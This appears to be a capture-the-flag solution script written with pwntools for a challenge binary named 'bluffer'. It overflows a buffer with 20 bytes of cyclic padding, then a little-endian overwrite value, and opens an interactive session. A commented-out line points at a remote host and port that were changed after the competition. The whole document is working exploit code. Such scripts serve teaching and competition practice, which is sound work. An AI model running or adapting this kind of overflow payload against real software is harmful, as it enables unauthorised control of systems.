from pwn import *

p = process("./bluffer")
# p = remote("HOST", PORT) # modified after competition

ngab = hex(5134160)[2:]

pay = cyclic(20)
pay += bytes.fromhex(ngab)[::-1]

p.sendline(pay)

p.interactive()
